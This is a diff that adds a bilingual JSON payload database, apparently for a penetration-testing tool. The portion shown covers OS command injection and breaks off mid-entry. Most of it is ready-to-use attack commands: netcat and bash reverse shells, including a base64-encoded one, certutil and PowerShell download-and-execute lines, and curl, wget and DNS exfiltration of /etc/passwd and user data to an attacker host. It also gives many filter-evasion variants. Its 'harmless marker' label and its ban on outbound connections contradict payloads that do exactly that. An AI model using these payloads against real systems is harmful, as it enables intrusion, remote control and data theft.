@@ -1,0 +1,4033 @@
+{
+  "schemaVersion": 1,
+  "contentStandard": 3,
+  "sourceIds": [
+    "rce-command-injection",
+    "file-upload-ntfs-ads-name",
+    "file-download-path-normalization",
+    "fileup-php-stream-wrapper-inclusion",
+    "fileup-lfi-filter-transform-boundary",
+    "rce-include",
+    "ssti-jinja2",
+    "auth2-redis-webshell",
+    "auth2-redis-crontab"
+  ],
+  "entries": [
+    {
+      "id": "rce-command-injection",
+      "name": {
+        "zh": "操作系统命令注入无害标记",
+        "en": "OS Command Injection Harmless Marker"
+      },
+      "description": {
+        "zh": "覆盖操作系统命令注入的探测与利用：从基础注入点探测与 Linux/Windows 命令拼接，到时间盲注延时确认，再到外带数据回传，并附空格、关键字与编码绕过变体。",
+        "en": "Covers probing and exploitation of OS command injection: from basic injection-point detection and Linux/Windows command chaining through time-based blind confirmation to out-of-band data exfiltration, with space, keyword, and encoding bypass variants."
+      },
+      "category": {
+        "zh": "RCE远程代码执行",
+        "en": "RCE Remote Code Execution"
+      },
+      "subCategory": {
+        "zh": "命令注入基础与盲注",
+        "en": "Command Injection Basics & Blind"
+      },
+      "tags": [
+        "rce",
+        "command",
+        "injection",
+        "os"
+      ],
+      "prerequisites": [
+        {
+          "zh": "确认 操作系统命令注入无害标记 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。",
+          "en": "Confirm that the target, accounts, data, component version, and stop conditions for OS Command Injection Harmless Marker are inside a reversible authorized lab scope."
+        },
+        {
+          "zh": "准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。",
+          "en": "Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "探测命令注入",
+            "en": "Validation step 1 for OS Command Injection Harmless Marker"
+          },
+          "command": "; id\n| id\n`id`\n$(id)\n&& id\n|| id\ntest;id\ntest|id",
+          "description": {
+            "zh": "在注入点分别以 ;、|、反引号、$()、&&、|| 执行 id，探测命令注入点。命中判据：响应包含 id 的输出（uid=…）或与基线响应出现可辨识差异。",
+            "en": "Execute id through ;, |, backticks, $(), &&, and || at the injection point to probe for command injection. Success check: the response contains id output (uid=...) or a recognizable difference from the baseline."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "Linux命令分隔符",
+                "en": "Linux command separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "|",
+              "explanation": {
+                "zh": "管道符，传递输出",
+                "en": "Pipe operator, pass output"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "`",
+              "explanation": {
+                "zh": "反引号命令替换",
+                "en": "Backtick command substitution"
+              },
+              "type": "value"
+            },
+            {
+              "part": "$()",
+              "explanation": {
+                "zh": "命令替换语法",
+                "en": "Command substitution syntax"
+              },
+              "type": "function"
+            },
+            {
+              "part": "&&",
+              "explanation": {
+                "zh": "前命令成功后执行",
+                "en": "Execute if previous command succeeds"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "||",
+              "explanation": {
+                "zh": "前命令失败后执行",
+                "en": "Execute if previous command fails"
+              },
+              "type": "operator"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "Linux命令注入",
+            "en": "Validation step 2 for OS Command Injection Harmless Marker"
+          },
+          "command": "; whoami\n; id\n; cat /etc/passwd\n; ls -la /\n; nc -e /bin/bash {ATTACKER_HOST} {LPORT}\n; bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1",
+          "description": {
+            "zh": "在 Linux 注入点执行 whoami、id、cat /etc/passwd 与目录列举，nc/bash 反弹行仅用于已授权监听器场景。命中判据：响应包含当前用户名、uid=… 或 /etc/passwd 内容；反弹 Shell 在监听器上获得会话。",
+            "en": "Run whoami, id, cat /etc/passwd, and directory listing at a Linux injection point; the nc/bash reverse-shell lines apply only with an authorized listener. Success check: the response contains the current username, uid=..., or /etc/passwd content, and a reverse shell lands on the listener."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "whoami",
+              "explanation": {
+                "zh": "显示当前用户",
+                "en": "DisplaycurrentUsers"
+              },
+              "type": "command"
+            },
+            {
+              "part": "nc -e",
+              "explanation": {
+                "zh": "Netcat反弹Shell",
+                "en": "NetcatReverse Shell"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/dev/tcp",
+              "explanation": {
+                "zh": "Bash网络重定向",
+                "en": "BashNetworkRedirect"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "Windows命令注入",
+            "en": "Validation step 3 for OS Command Injection Harmless Marker"
+          },
+          "command": "& whoami\n& dir\n& type C:\\windows\\win.ini\n& certutil -urlcache -split -f http://{ATTACKER_HOST}/shell.exe shell.exe & shell.exe\n& powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_HOST}/shell.ps1')\"",
+          "description": {
+            "zh": "判据: 在 Windows 注入点执行 whoami、dir、type win.ini 与 certutil/powershell 下载执行。命中判据：whoami/dir/type 行响应包含当前用户名、目录列表或 win.ini 内容；certutil/powershell 行以攻击者 HTTP 日志出现 shell.exe/shell.ps1 下载请求且后续命令执行为命中。",
+            "en": "Run whoami, dir, type win.ini, and certutil/powershell download-exec at a Windows injection point. Success check: the response contains the current username, a directory listing, or win.ini content, and the attacker HTTP log records the shell.exe/shell.ps1 fetch."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "&",
+              "explanation": {
+                "zh": "Windows命令分隔符",
+                "en": "Windows command separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "certutil",
+              "explanation": {
+                "zh": "Windows下载工具",
+                "en": "WindowsDownloadTools"
+              },
+              "type": "value"
+            },
+            {
+              "part": "powershell -c",
+              "explanation": {
+                "zh": "执行PowerShell命令",
+                "en": "Execute PowerShellCommand"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "时间盲注延时探测",
+            "en": "Time-based blind injection probe"
+          },
+          "command": "; sleep 5\n; ping -c 5 {ATTACKER_HOST}\n& timeout 5",
+          "description": {
+            "zh": "以 ;/& 注入 sleep 5、ping -c 5 与 timeout 5 三种延时命令，通过响应耗时差验证注入点真实存在。",
+            "en": "Inject sleep 5, ping -c 5, and timeout 5 through ; and & and use response-time deltas to confirm the injection point."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "sleep",
+              "explanation": {
+                "zh": "Linux延时命令",
+                "en": "Linux delay command"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "timeout",
+              "explanation": {
+                "zh": "Windows延时命令",
+                "en": "Windows delay command"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "外带数据",
+            "en": "Validation step 5 for OS Command Injection Harmless Marker"
+          },
+          "command": "; curl http://{ATTACKER_HOST}/?data=$(whoami)\n; wget http://{ATTACKER_HOST}/?data=$(id|base64)\n; nslookup $(whoami).{ATTACKER_HOST}\n; ping $(whoami | xxd -p).{ATTACKER_HOST}",
+          "description": {
+            "zh": "通过 curl/wget 与 nslookup/ping 把命令输出经 HTTP 或 DNS 发往攻击者侧收集端。命中判据：攻击者 HTTP 访问日志或 DNS 权威日志收到包含 whoami/id 输出的请求。",
+            "en": "Exfiltrate command output over HTTP or DNS to the attacker collector via curl/wget and nslookup/ping. Success check: the attacker HTTP access log or DNS authoritative log receives requests carrying whoami/id output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "curl",
+              "explanation": {
+                "zh": "HTTP请求工具",
+                "en": "HTTPRequestTools"
+              },
+              "type": "command"
+            },
+            {
+              "part": "nslookup",
+              "explanation": {
+                "zh": "DNS查询工具",
+                "en": "DNSQueryTools"
+              },
+              "type": "value"
+            },
+            {
+              "part": "xxd -p",
+              "explanation": {
+                "zh": "转换为十六进制",
+                "en": "Convert to hexadecimal"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "命令注入只执行 marker 回显与 sleep 定时——禁用任何写文件与网络外连形态；时间盲注次数控制在个位数。",
+          "en": "Restrict injection to marker echo and sleep timing — no file writes or outbound connections, and keep timing-blind attempts to single digits."
+        },
+        {
+          "zh": "出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。",
+          "en": "Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空格绕过",
+            "en": "Space bypass"
+          },
+          "command": ";{cat,/etc/passwd}\n;cat$IFS/etc/passwd\n;cat</etc/passwd\n;cat%09/etc/passwd\n;cat${IFS}/etc/passwd",
+          "description": {
+            "zh": "用 {cat,..}、$IFS、重定向与 %09/${IFS} 等写法替代空格读取 /etc/passwd。命中判据：响应包含 /etc/passwd 内容（root:x:0:0:…）。",
+            "en": "Replace spaces with {cat,..}, $IFS, redirection, and %09/${IFS} styles to read /etc/passwd. Success check: the response contains /etc/passwd content (root:x:0:0:...)."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "$IFS",
+              "explanation": {
+                "zh": "内部字段分隔符变量",
+                "en": "Internal Field Separator (IFS) variable"
+              },
+              "type": "variable"
+            },
+            {
+              "part": "%09",
+              "explanation": {
+                "zh": "Tab字符URL编码",
+                "en": "TabcharacterURL Encoding"
+              },
+              "type": "encoding"
+            },
+            {
+              "part": "{}",
+              "explanation": {
+                "zh": "大括号扩展",
+                "en": "Brace expansion"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "关键字绕过",
+            "en": "Validation step 2 for OS Command Injection Harmless Marker"
+          },
+          "command": "; /bin/c[a]t /etc/passwd",
+          "description": {
+            "zh": "用空引号、反斜杠与通配符拆分 cat 关键字后读取 /etc/passwd。命中判据：响应包含 /etc/passwd 内容且请求中未出现完整 cat 字样。",
+            "en": "Split the cat keyword with empty quotes, backslashes, and globs, then read /etc/passwd. Success check: the response contains /etc/passwd content while the full string cat never appears in the request."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "Linux命令分隔符",
+                "en": "Linux command separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "c''at",
+              "explanation": {
+                "zh": "空引号拆分cat",
+                "en": "Empty quotes split cat"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "c\\at",
+              "explanation": {
+                "zh": "反斜杠拆分命令名",
+                "en": "Backslash splits command name"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "c?a?t",
+              "explanation": {
+                "zh": "问号通配匹配字符",
+                "en": "Question-mark glob matches chars"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "ca[t]",
+              "explanation": {
+                "zh": "方括号通配等价cat",
+                "en": "Bracket glob equals cat"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "编码绕过",
+            "en": "Encoding Bypass"
+          },
+          "command": "; echo \"Y2F0IC9ldGMvcGFzc3dk\" | base64 -d | bash\n; $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
+          "description": {
+            "zh": "以 Base64 管道解码或 printf 十六进制还原命令后执行 cat /etc/passwd。命中判据：响应包含 /etc/passwd 内容且明文命令未出现在请求中。",
+            "en": "Rebuild cat /etc/passwd via a Base64 pipe or printf hex decoding and execute it. Success check: the response contains /etc/passwd content and no plaintext command appears in the request."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "base64 -d",
+              "explanation": {
+                "zh": "Base64解码",
+                "en": "Base64Decoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "printf \"\\x\"",
+              "explanation": {
+                "zh": "十六进制编码",
+                "en": "hexadecimalEncoding"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "WAF 绕过：$IFS 绕过",
+            "en": "Validation step 1 for Shell IFS Whitespace-Substitution Injection"
+          },
+          "command": "whoami\nwhoami$IFS\nwh\\oami\nw'h'oami\nwhoami${IFS}\nwhoami${IFS:- }\nwhoami$IFS$IFS\ncat$IFS/flag\ncat${IFS}/flag\ncat${IFS:- }/flag\ncat$IFS$IFS/flag\nls$IFS/\nls${IFS}/\nls${IFS:- }/\nid$IFS\nid${IFS}\nid${IFS:- }\nuname$IFS-a\nuname${IFS}-a\nuname${IFS:- }-a\npwd$IFS\npwd${IFS}\npwd${IFS:- }\nhostname$IFS\nhostname${IFS}\nhostname${IFS:- }",
+          "description": {
+            "zh": "$IFS 绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：$IFS 变体仍执行命令并返回对应输出（如 cat /flag 的内容）。",
+            "en": "Run this Shell IFS Whitespace-Substitution Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: the $IFS variants still execute and return the matching output (e.g. the contents of cat /flag)."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "$IFS",
+              "explanation": {
+                "zh": "内部字段分隔符变量",
+                "en": "Internal field separator variable"
+              },
+              "type": "value"
+            },
+            {
+              "part": "${IFS:- }",
+              "explanation": {
+                "zh": "IFS为空时回退空格",
+                "en": "Falls back to space when IFS empty"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "w'h'oami",
+              "explanation": {
+                "zh": "引号拆分命令名",
+                "en": "Quote-split command name"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "wh\\oami",
+              "explanation": {
+                "zh": "反斜杠拆分命令名",
+                "en": "Backslash-split command name"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "cat$IFS/flag",
+              "explanation": {
+                "zh": "IFS替代空格读flag",
+                "en": "IFS replaces space to read flag"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "WAF 绕过：标准测试",
+            "en": "Standard"
+          },
+          "command": "/bin/ca? /etc/passwd \n /bin/c[a]t /etc/passwd \n /bin/ca[t] /etc/passwd \n /usr/bin/wge? http://{ATTACKER_HOST}/shell.sh \n /usr/bin/cu?l http://{ATTACKER_HOST}/shell.sh \n /b?n/c?t /etc/passwd \n /b??/c?t /etc/passwd \n /*/c?t /etc/passwd \n /b*/c?t /etc/passwd",
+          "description": {
+            "zh": "用 ?、[]、* 通配符重组 /bin/cat 等路径执行读取，并配合 wget/curl 下载变体。命中判据：响应包含 /etc/passwd 内容（root:x:0:0:…）。",
+            "en": "Rebuilds /bin/cat-style paths with ?, [], and * globs for reads, plus wget/curl download variants. Success check: the response contains /etc/passwd content (root:x:0:0:...)."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/bin/ca?",
+              "explanation": {
+                "zh": "问号通配路径",
+                "en": "Question-mark glob in path"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/usr/bin/wge?",
+              "explanation": {
+                "zh": "wget路径通配变形",
+                "en": "wget path glob variant"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/b??/c?t",
+              "explanation": {
+                "zh": "多字符通配重组路径",
+                "en": "Multi-char globs rebuild path"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/*/c?t",
+              "explanation": {
+                "zh": "星号匹配任意目录",
+                "en": "Star matches any directory"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/etc/passwd",
+              "explanation": {
+                "zh": "目标文件路径",
+                "en": "Target file path"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "通配符与子串展开绕过",
+            "en": "Wildcard and Substring-Expansion Bypass"
+          },
+          "command": "/?a? /etc/passwd \n/?at /etc/passwd \n/???/??t /e?c/p?ss?? \nc[a]t ${PATH:0:1}etc${PATH:0:1}passwd \n${PATH:0:1}b?n${PATH:0:1}c?t /etc/passwd \n/???/b??h -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1 ",
+          "description": {
+            "zh": "以单字符通配重组 cat/bash 路径（完整样例见本条 command：/?at、目录段与命令名内的多段单 ? 通配），并以 ${PATH:0:1} 子串展开重建斜杠（bash ≥3），规避对 cat、/bin/cat、/etc/passwd 完整字面与 /bin/ca? 单点 glob 特征的规则；${PATH:0:1} 在标准 Linux PATH 下展开为 /。命中判据：响应含 root:x:0:0 或监听器收到回连，且请求不含 cat、/etc/passwd 字面。",
+            "en": "Rebuilds cat and bash paths through single-character globs (full samples in the command of this entry: /?at plus multi-segment single-? runs over the directory path and the command name) and reconstructs slashes from the ${PATH:0:1} substring (bash 3+), dodging rules that match the full literals cat, /bin/cat, /etc/passwd or the single /bin/ca? glob; ${PATH:0:1} expands to / on standard Linux PATH settings. Success: root:x:0:0 in the response or a callback on the listener, with no literal cat or /etc/passwd in the request."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/bin/ca?",
+              "explanation": {
+                "zh": "问号通配路径",
+                "en": "Question-mark glob in path"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/usr/bin/wge?",
+              "explanation": {
+                "zh": "wget路径通配变形",
+                "en": "wget path glob variant"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/b??/c?t",
+              "explanation": {
+                "zh": "多字符通配重组路径",
+                "en": "Multi-char globs rebuild path"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/*/c?t",
+              "explanation": {
+                "zh": "星号匹配任意目录",
+                "en": "Star matches any directory"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/etc/passwd",
+              "explanation": {
+                "zh": "目标文件路径",
+                "en": "Target file path"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "WAF 绕过：标准测试",
+            "en": "Standard"
+          },
+          "command": "%0acat%20/etc/passwd \n %0d%0acat%20/etc/passwd \n ;cat%09/etc/passwd \n ;cat%20/etc/passwd \n |cat%09/etc/passwd",
+          "description": {
+            "zh": "以 %0a、%0d%0a、%09 等控制字符替代分隔符或空格执行 cat。命中判据：响应包含 /etc/passwd 内容。",
+            "en": "Uses control characters such as %0a, %0d%0a, and %09 in place of separators or spaces to run cat. Success check: the response contains /etc/passwd content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%0a",
+              "explanation": {
+                "zh": "URL编码换行符",
+                "en": "URL-encoded newline"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%0a",
+              "explanation": {
+                "zh": "URL编码CRLF换行",
+                "en": "URL-encoded CRLF"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "cat%09",
+              "explanation": {
+                "zh": "Tab替代空格分隔",
+                "en": "Tab replaces space separator"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/etc/passwd",
+              "explanation": {
+                "zh": "目标文件路径",
+                "en": "Target file path"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "WAF 绕过：换行符Tab WAF绕过",
+            "en": "WAF Bypass: Newline/Tab"
+          },
+          "command": "%0a%09cat%20/etc/passwd \n%0d%0a%09cat%20/etc/passwd \n%09%0acat%20/etc/passwd \n;cat$(printf%20'\\t')/etc/passwd \n|cat$(printf%20'\\x09')/etc/passwd",
+          "description": {
+            "zh": "换行与 Tab 的组合编码（%0a%09、%0d%0a%09、%09%0a）在一条载荷内同时呈现两种控制符，针对只匹配单控制符或单一 %0a 形态的规则；$(printf) 在 shell 层生成真实 Tab 字节，不依赖传输层编码。命中判据：passwd 内容返回，且原始请求中未见裸空格分隔 cat 与路径。",
+            "en": "Combined newline-plus-tab encodings (%0a%09, %0d%0a%09, %09%0a) present two control characters in one payload against rules matching single separators or lone %0a; $(printf) emits a real tab byte at the shell layer without relying on transport encoding. Success: passwd content returned with no bare space separating cat from its path in the raw request."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%0a",
+              "explanation": {
+                "zh": "URL编码换行符",
+                "en": "URL-encoded newline"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%0a",
+              "explanation": {
+                "zh": "URL编码CRLF换行",
+                "en": "URL-encoded CRLF"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "cat%09",
+              "explanation": {
+                "zh": "Tab替代空格分隔",
+                "en": "Tab replaces space separator"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/etc/passwd",
+              "explanation": {
+                "zh": "目标文件路径",
+                "en": "Target file path"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "Shell 词法混淆集合",
+            "en": "Shell Lexical Obfuscation Set"
+          },
+          "command": "cat$u+/etc$u/passwd$u \n/bin$u/bash$u+-i+>&+/dev/tcp/{ATTACKER_HOST}/{LPORT}+0>&1 \n\";cat+/etc/passwd+# \n;+$u+cat+/etc$u/passwd$u \n;+$u+cat+/etc$u/passwd+\\# \n/???/??t+/???/??ss?? \n;+cat+/e'tc/pass'wd \n/???/??t /???/??ss?? \n/???/n? 2130706433 1337 \n/bin/cat$u /etc/passwd$u",
+          "description": {
+            "zh": "空变量 $u 拆词、glob 重组、引号拆分与注释截断的合集；原第 9 条过滤器复测条目的 /bin/cat$u 行并入本集合统一维护。命中判据：passwd 内容返回或回连建立，且请求不含未拆分的 cat /etc/passwd 字面。",
+            "en": "A collection of empty-variable $u word splits, glob rebuilds, quote splitting, and comment truncation; the /bin/cat$u line from the retired retest entry is consolidated here. Success: passwd content returned or a callback established, with no unsplit cat /etc/passwd literal in the request."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "$u",
+              "explanation": {
+                "zh": "未定义空变量拼接",
+                "en": "Undefined empty variable splicing"
+              },
+              "type": "value"
+            },
+            {
+              "part": "cat+/etc/passwd",
+              "explanation": {
+                "zh": "加号代替空格",
+                "en": "Plus sign replaces space"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/???/??t",
+              "explanation": {
+                "zh": "通配符匹配cat路径",
+                "en": "Globs match the cat path"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "2130706433",
+              "explanation": {
+                "zh": "127.0.0.1十进制形式",
+                "en": "Decimal form of 127.0.0.1"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/e'tc/pass'wd",
+              "explanation": {
+                "zh": "引号拆分路径关键字",
+                "en": "Quotes split path keyword"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "\\#",
+              "explanation": {
+                "zh": "转义井号注释尾部",
+                "en": "Escaped hash comments the tail"
+              },
+              "type": "comment"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "Shell 词法混淆管道变体",
+            "en": "Shell Lexical Obfuscation Pipe Variants"
+          },
+          "command": ";+cat+/etc$u/passwd$u+|+base64$u \ncat$u+/etc/passwd+|+nc$u+{ATTACKER_HOST}+1337 \nc$u'a't+/etc$u/passwd \n;+$u+c$u'a't+${u}/etc/passwd \n/???/??t$u+/???/??ss??",
+          "description": {
+            "zh": "把 $u 空变量推进管道段与引号内部：管道前的 base64/nc 与 $u 同现、引号内插 $u 使 cat 以 c$u'a't 形态出现，规避对整行 cat /etc/passwd 及管道外单点 $u 特征的规则。命中判据：passwd 的 base64 回显或内容返回，且 cat 以拆分形态出现。",
+            "en": "Pushes the empty $u variable into pipe segments and inside quotes: base64 and nc share the pipe with $u, and c$u'a't splits cat across a quoted span, evading full-line cat /etc/passwd signatures and single-position $u checks. Success: base64 echo of passwd or its content returned with cat present only in split form."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "$u",
+              "explanation": {
+                "zh": "未定义空变量拼接",
+                "en": "Undefined empty variable splicing"
+              },
+              "type": "value"
+            },
+            {
+              "part": "cat+/etc/passwd",
+              "explanation": {
+                "zh": "加号代替空格",
+                "en": "Plus sign replaces space"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/???/??t",
+              "explanation": {
+                "zh": "通配符匹配cat路径",
+                "en": "Globs match the cat path"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "2130706433",
+              "explanation": {
+                "zh": "127.0.0.1十进制形式",
+                "en": "Decimal form of 127.0.0.1"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/bin/cat$u",
+              "explanation": {
+                "zh": "空变量混入绝对路径",
+                "en": "Empty variable inside path"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "Base64 编码反弹绕过",
+            "en": "Base64-encoded reverse-shell bypass"
+          },
+          "command": "; echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==\" | base64 -d | bash",
+          "description": {
+            "zh": "将反弹 Shell 命令 Base64 编码后经 echo|base64 -d|bash 解码执行，验证绕过对明文反弹命令关键字的过滤。复制后需将 Base64 解码内容中的回连 IP 与端口改为自有监听地址并重新编码。命中判据：过滤器放行该请求且监听器收到反弹连接。",
+            "en": "Base64-encodes a reverse-shell command and runs it through echo|base64 -d|bash to bypass plaintext-keyword filtering. After copying, change the callback IP and port inside the Base64-decoded content to your own listener and re-encode. Success check: the filter lets the request pass and the listener receives the reverse connection."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "base64 -d",
+              "explanation": {
+                "zh": "解码 Base64 编码的载荷",
+                "en": "Decode the Base64-encoded payload"
+              },
+              "type": "command"
+            },
+            {
+              "part": "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1",
+              "explanation": {
+                "zh": "解码后的反弹 Shell 命令",
+                "en": "The decoded reverse-shell command"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "延时盲注混淆探测",
+            "en": "Time-Delay Obfuscated Probing"
+          },
+          "command": ";slee\\p 5\n|s'l'e'e'p 5\n`s'l'e'e'p${IFS}5`\n$(sl''eep 5)\n& sl\\eep 5",
+          "description": {
+            "zh": "以反斜杠与引号拆分构造 sleep 字面（slee\\p、s'l'e'e'p、sl''eep），在时间盲注确认注入点的同时规避对 sleep 明文的黑名单；语义为时间盲注探测，需对比基线响应时间。命中判据：响应延时约 5 秒而基线即时返回。",
+            "en": "Builds sleep literals through backslash and quote splits (slee\\p, s'l'e'e'p, sl''eep) so time-based probing both confirms the injection point and dodges plaintext sleep blacklists; this is time-blind probing, so compare against a baseline response time. Success: response delayed roughly 5 seconds while the baseline returns immediately."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "sleep 5",
+              "explanation": {
+                "zh": "Linux延时命令",
+                "en": "Linux delay command"
+              },
+              "type": "value"
+            },
+            {
+              "part": "timeout 5",
+              "explanation": {
+                "zh": "Windows延时命令",
+                "en": "Windows delay command"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "DNS OOB 验证",
+            "en": "DNS Out-of-Band Verification"
+          },
+          "command": "; host $(id | base64).{ATTACKER_HOST}\n; dig +short $(whoami | base64 | tr -d \"=+/\").{ATTACKER_HOST}\n; ping -c 1 $(whoami).{ATTACKER_HOST}\n& nslookup %USERNAME%.{ATTACKER_HOST}",
+          "description": {
+            "zh": "语义为 DNS 外带验证通道而非注入绕过：以 base64/hex 编码的 whoami、id 作子域回传，与执行集的 nslookup $(whoami) 明文行去重，host/dig 解析器差异化。命中判据：DNS 日志中出现携带编码数据的子域查询。",
+            "en": "A DNS out-of-band verification channel rather than an injection bypass: base64-encoded whoami and id ride out as subdomain labels, deduplicated against the plaintext nslookup line in the execution set while host and dig vary the resolver. Success: DNS logs show subdomain queries carrying the encoded data."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "nslookup",
+              "explanation": {
+                "zh": "DNS查询工具",
+                "en": "DNSQueryTools"
+              },
+              "type": "value"
+            },
+            {
+              "part": "$(whoami)",
+              "explanation": {
+                "zh": "命令替换获取用户名",
+                "en": "CommandReplaceObtainUsername"
+              },
+              "type": "value"
+            },
+            {
+              "part": ".attacker.com",
+              "explanation": {
+                "zh": "攻击者控制的域名",
+                "en": "Attacker-controlled domain"
+              },
+              "type": "domain"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "HTTP外带",
+            "en": "HTTPOut-of-band"
+          },
+          "command": "; curl -d @/etc/passwd http://{ATTACKER_HOST}/\n; wget --post-file=/etc/passwd http://{ATTACKER_HOST}/\n; curl -T /etc/passwd http://{ATTACKER_HOST}/\n& certutil -urlcache -f http://{ATTACKER_HOST}/?data=%USERNAME%",
+          "description": {
+            "zh": "HTTP 外带去重后保留文件级回传能力：POST 体（curl -d @）、wget --post-file 与 PUT（curl -T）三条通道可整文件外传，certutil 覆盖 Windows 侧；与执行集的 $(whoami) 参数拼接行不重叠。命中判据：攻击端收到含 passwd 内容的请求体。",
+            "en": "Deduplicated to file-grade exfiltration: POST body (curl -d @), wget --post-file, and PUT (curl -T) move whole files out while certutil covers Windows; no overlap with the execution set $(whoami) query lines. Success: the attacker endpoint receives a request body containing the passwd content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "; curl http://attacker.com/?data=$(whoami)",
+              "explanation": {
